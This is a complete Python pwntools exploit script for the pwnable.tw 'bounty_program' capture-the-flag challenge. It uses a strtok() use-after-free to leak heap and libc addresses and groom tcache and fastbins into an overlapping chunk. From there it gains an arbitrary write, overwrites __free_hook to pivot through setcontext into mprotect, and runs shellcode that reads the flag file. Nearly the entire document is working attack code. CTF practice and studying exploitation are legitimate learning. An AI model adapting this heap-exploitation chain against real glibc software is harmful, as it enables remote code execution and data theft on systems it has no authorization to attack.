from pwn import *

exe = context.binary = ELF('./bounty_program')
libc = ELF('libc-18292bd12d37bfaf58e8dded9db7f1f5da1192cb.so')

if os.environ.get('TMUX'):
    context.terminal = 'tmux splitw -h'.split()

host = args.HOST or 'chall.pwnable.tw'
port = int(args.PORT or 10208)
if args.BETA:
    port = 10410


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(host, port, *a, **kw)
    elif args.ATTACH:
        p = exe.process(argv, *a, **kw)
        gdb.attach(p, gdbscript=gdbscript)
        return p
    elif args.GDB:
        p = gdb.debug([exe.path] + argv, *a, gdbscript=gdbscript, **kw)
        return p
    else:
        return exe.process(argv, *a, **kw)

gdbscript = '''
continue
'''

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# FORTIFY:  Enabled

envname = 'FOO'
envval = ''

if args.REMOTE:
    io = start()
    io.sendlineafter('Name:', envname)
    io.sendlineafter('Value:', envval)

else:
    env = dict(os.environ)
    env[envname] = envval
    io = start(env=env)


def leak(delim, bits=64):
    bytesize = 8 if bits == 64 else 4
    packer = u64 if bits == 64 else u32
    if isinstance(delim, int):
        data = io.recvn(delim)
    else:
        data = io.recvuntil(delim, drop=True)
    return packer(data.ljust(bytesize, b'\x00'))

def p(msg, x):
    info('{}: {:#x}'.format(msg, x))

prompt = 'Your choice: '

def m(n):
    io.sendlineafter(prompt, str(n))

def add_user(name, pw, contact):
    assert len(name) < 0x1f, 'name too long'
    assert len(name) < 0x10, 'pass too long'
    assert len(name) < 0x20, 'contact too long'
    m(2)
    io.sendafter(':', name)
    io.sendafter(':', pw)
    io.sendafter(':', contact)

def login(name, pw):
    m(1)
    io.sendafter(':', name)
    io.sendafter(':', pw)

def bounty_menu():
    m(1)

def print_products():
    m(3)

def change_contact(data):
    m(4)
    io.sendafter(':', data)

def main_menu():
    m(0)

def add_product(name, company, comment):
    assert len(name) < 0x30, 'name too long'
    assert len(company) < 0x20, 'company too long'
    assert len(comment) < 0x10, 'comment too long'
    m(1)
    io.sendafter('Product:', name)
    io.sendafter('Company:', company)
    io.sendafter('Comment:', comment)

def add_type(size, data, prices):
    assert size == -1 or len(data) < size, 'data too long'
    m(2)
    io.sendlineafter('Size:', str(size))
    io.sendafter('Type:', data)
    for price in prices:
        io.sendlineafter('Price:', str(price))

def remove_type(size, data):
    assert len(data) < size, 'data too long'
    m(4)
    io.sendlineafter('Size:', str(size))
    io.sendafter('Type:', data)

def submit_report(pid, type, title, id, descsize, desc):
    assert len(title) < 0xff, 'title too long'
    assert len(desc) < descsize, 'desc too long'
    m(3)
    io.sendlineafter('ID:', str(pid))
    io.sendlineafter('Type:', str(type))
    io.sendafter('Title:', title)
    io.sendlineafter('ID:', str(id))
    io.sendlineafter('descripton:', str(descsize))
    io.sendafter('Descripton:', desc)

def modify_report(pid, id, title, descsize, desc):
    m(5)
    io.sendlineafter('Product ID:', str(pid))
    io.sendlineafter('Bug ID:', str(id))
    io.sendafter('Title:', title)
    io.sendlineafter('descripton:', str(descsize))
    io.sendafter('Descripton:', desc)
    io.sendlineafter('? ', 'n')


add_user('A', 'B', 'C')
login('A', 'B')
bounty_menu()

info('Stage 1: Leak heap pointer')

# fill tcache[0x60]
for _ in range(7):
    add_type(0x58, '\x00', [])

# move strtok()s "olds" to just before `char *company` in 
# in a virtual overlapping "struct Product"
add_type(0x58, 'A'*48, [1])

# re-use chunk for struct Product
add_product('victim', 'Q', 'R')

# trigger strtok() UAF
add_type(-1, '', [])
io.recvuntil('type: ')
heap_leak = leak('\n')
p('heap_leak', heap_leak)
if heap_leak >> 40 != 0x55 and heap_leak >> 40 != 0x56:
    error('bad heap leak')
io.sendlineafter('Price:', '1')

info('Stage 2: Leak libc pointer')

# fill tcache[0xa0]
for _ in range(7):
    add_type(0x98, '\x00', [])

# setup "olds" to a bk ptr of 0xa0 chunk
add_type(0x98, 'A'*8 + '\x00', [1])

# strtok UAF again
add_type(-1, '', [])
io.recvuntil('type: ')
libc_leak = leak('\n')
if libc_leak >> 40 != 0x7f:
    error('bad libc leak')

p('libc_leak', libc_leak)
if libc_leak & 0xff == 0x30:
    info('malloc_consolidate() version')
    libc.address = libc_leak - 0x3ebd30
else:
    # still in unsortbin
    libc.address = libc_leak - 0x3ebca0

p('libc', libc.address)
io.sendlineafter('Price:', '1')

'''
Now we make a heap layout as follows

tcache[0x70] : 0x12c20 -> ...
fastbin[0x70]: 0x12c90

0x0ff30     : struct Report
0x10010     : fake 0x70 chunk inside report.title
0x10038     : char *description

We trigger initialize "olds" to fd ptr of 0x12c90,
and move it to tcache[0x70]. Then UAF to corrupt fd ptr
and get a fake chunk 0x10020, overlapping struct Report.
'''

info('Stage 3: Aligning heap')

report_sz = 0x150
cur_top = heap_leak + 0x590
target_align = 0xff20
pad_needed = target_align - (cur_top & 0xffff)
pad_needed += 0x10000

desc_len = pad_needed - report_sz - 0x8
victim = cur_top + pad_needed + 0x10

p('cur_top', cur_top)
p('pad_needed', pad_needed)
p('desc_len', desc_len)
p('victim', victim)

submit_report(0, 0, 'padder11\n', 11, desc_len, 'paddder11\n')

# allocate victim
victim_desc_len = 0x2c00 - 0xa0 - 0x70
submit_report(0, 0, 'victim22\n', 22, victim_desc_len, 'victim22\n')

# make room in vuln array; need to move chunks between fastbin and tcache
remove_type(0x98, 'XSS')
remove_type(0x98, 'DoS')
remove_type(0x98, 'A'*48)
remove_type(0x98, 'A'*8)
remove_type(0x98, '\x00')
remove_type(0x98, p64(heap_leak))

info('Stage 4: Allocating chunk @ 0x2c10')
add_type(0x98, 'v'*0x58, [3])
add_type(0x98, 'u'*0x58, [4])

info('Stage 5: Preparing bins and freelists')

[add_type(0x68, '\x00', []) for _ in range(7)]

# shrink description to free up and large chunk
modify_report(0, 22, fit({
    0xe0: 0,
    0xe8: 0x71,
}), victim_desc_len - 0xa0, fit({
    0: 'vict22\n',
    0x8: 0x21,
    0x28: 0x21,
}, filler=b'\x00'))

# moving target chunks into place
remove_type(0x98, 'u'*0x58)

# pop two tcache[0x70]
add_type(0x98, 'n'*0x58, [99])
add_type(0x98, 'm'*0x58, [99])

remove_type(0x98, 'v'*0x58)

info('Stage 6: Corrupt freelist')

# set olds to start of fd ptr 
add_type(0x68, '\x00', [])

# trigger UAF to change 2c to 00
add_type(-1, '', [8, 9])

info('Stage 7: Groom freelist and tcache to get overlap at head')

# make a chunk for later modify_report()
modify_report(0, 11, 'padder11', desc_len - 0x1000, 'A\n')

# pop top tcache[0x70]
add_type(0x68, 'T'*0x58, [6])

# pop overlapping chunk
add_type(0x68, 'O'*0x58, [6])

# fill tcache
remove_type(0x98, 'T'*0x58)
remove_type(0x98, 'n'*0x58)

info('Stage 8: Free root account to get write prim')

# put overlapping chunk in fastbin[0x70]
remove_type(0x98, 'O'*0x58)

# ready to corrupt Report!
root_account = heap_leak - 0x3f0
p('root_account', root_account)

# corrupt victim Report
add_type(0x68, fit({
    0x0: 0,
    # user ptr
    0x10: root_account,
    # description len
    0x18: 0x2020,
    # bug_id
    0x20: 1337,
    # description
    0x28: root_account,
}, filler=b'\x00'), [])

# free root user -> unsortbin
modify_report(0, 1337, 'victim22', 0xfd8, 'A')

# move from small to fastbins
add_type(0x68, '\x00', [])
add_type(0x58, '\x00', [])

# arbitrary write
def w64(addr, what):
    '''
    struct User
    {
        char password[16];
        char username[32];
        unsigned int payout;
        int field_34;
        char *contact;
        __int64 randint;
        int refcnt;
        int field_4C;
        User *next;
    };
    '''
    add_type(0x58, fit({
        # 0x0: 'hello\n',
        0x38: addr,
    }, filler=b'\x00'), [])
    # pause()
    main_menu()
    change_contact(what)
    bounty_menu()

# corrupt victim Report
add_type(0x68, fit({
    0x0: 0,
    # user ptr
    0x10: root_account,
    # description len
    0x18: 0x2020,
    # bug_id
    0x20: 1337,
    # description
    0x28: victim+0x40,
}, filler=b'\x00'), [])

# make tcache[0x20] pointing to free_hook
tcache_20 = heap_leak - 0x8f0
w64(tcache_20, p64(libc.symbols['__free_hook'])[:6])

# alloc over free_hook, write context + shcode to heap
here = victim + 0x3070
p('rop', here)
add_type(0x2000, fit({
    0x0: p64(libc.symbols['setcontext']+53),
    0x8: here+0xc0,
    # 0x8: b'c'*8,

    # setcontext
    0x48: [
        # r12-r15
        0x12, 0x13, 0x14, 0x15,
        # rdi, rsi, rbp
        (here+0xc0) & 0xfffffffffffff000,
        0x1000,
        0x0,
        # rbx, rdx, _, rcx
        0x0, 0x7, 0x0, 0x0,

        #rsp
        here+0x8,
        #pc
        libc.symbols['mprotect']
    ],

    0xc0: asm(
        'sub rsp, 0x200\n' +
        shellcraft.echo('win\n') +
        shellcraft.open('/home/bounty_program/flag', 0, 0) + 
        '''
        mov edi, eax
        mov rsi, rsp
        mov rdx, 0x100
        mov eax, 0
        syscall
        mov edi, 1
        mov eax, 1
        syscall
        ''' +
        shellcraft.exit(0)
        # shellcraft.sendfile(1, 4, 0, 0xb0)
    ),
    
}, filler=b'\x00'), [1])

io.interactive()